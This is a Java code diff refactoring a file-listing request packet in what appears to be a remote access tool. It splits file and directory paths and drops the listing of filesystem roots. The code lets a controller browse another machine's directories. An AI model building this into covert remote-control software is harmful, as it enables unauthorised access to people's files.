@@ -13,17 +13,19 @@ import de.sogomn.rat.ActiveConnection;
 public class FileRequestPacket extends AbstractPingPongPacket {
 	
 	private String rootFile;
-	private String[] childrenPaths;
+	private String[] filePaths;
+	private String[] directoryPaths;
 	
-	private static final byte INCOMING = 1;
+	@SuppressWarnings("unused")
+	private static final byte DIRECTORY = 2;
+	private static final byte FILE = 1;
 	private static final byte END = 0;
-	private static final String FILE_SEPARATOR = "/";
 	
 	public FileRequestPacket(final String rootFile) {
 		this.rootFile = rootFile;
 		
 		type = REQUEST;
-		childrenPaths = new String[0];
+		filePaths = directoryPaths = new String[0];
 	}
 	
 	public FileRequestPacket() {
@@ -39,8 +41,8 @@ public class FileRequestPacket extends AbstractPingPongPacket {
 	
 	@Override
 	protected void sendData(final ActiveConnection connection) {
-		for (final String path : childrenPaths) {
-			connection.writeByte(INCOMING);
+		for (final String path : filePaths) {
+			connection.writeByte(FILE);
 			connection.writeUtf(path);
 		}
 		
@@ -56,7 +58,7 @@ public class FileRequestPacket extends AbstractPingPongPacket {
 	protected void receiveData(final ActiveConnection connection) {
 		final ArrayList<String> pathList = new ArrayList<String>();
 		
-		while (connection.readByte() == INCOMING) {
+		while (connection.readByte() == FILE) {
 			final String path = connection.readUtf();
 			
 			pathList.add(path);
@@ -64,28 +66,21 @@ public class FileRequestPacket extends AbstractPingPongPacket {
 		
 		final int length = pathList.size();
 		
-		childrenPaths = new String[length];
-		childrenPaths = pathList.toArray(childrenPaths);
+		filePaths = new String[length];
+		filePaths = pathList.toArray(filePaths);
 	}
 	
 	@Override
 	protected void executeRequest(final ActiveConnection connection) {
-		final File[] children;
-		
-		if (rootFile.isEmpty() || rootFile.equals(FILE_SEPARATOR)) {
-			children = File.listRoots();
-		} else {
-			final File file = new File(rootFile);
-			
-			children = file.listFiles();
-		}
+		final File file = new File(rootFile);
+		final File[] children = file.listFiles();
 		
 		if (children == null) {
 			return;
 		}
 		
 		type = DATA;
-		childrenPaths = Stream.of(children)
+		filePaths = Stream.of(children)
 				.map(File::getAbsolutePath)
 				.toArray(String[]::new);
 		
@@ -97,8 +92,12 @@ public class FileRequestPacket extends AbstractPingPongPacket {
 		//...
 	}
 	
-	public String[] getPaths() {
-		return childrenPaths;
+	public String[] getFilePaths() {
+		return filePaths;
+	}
+	
+	public String[] getDirectoryPaths() {
+		return directoryPaths;
 	}
 	
 }
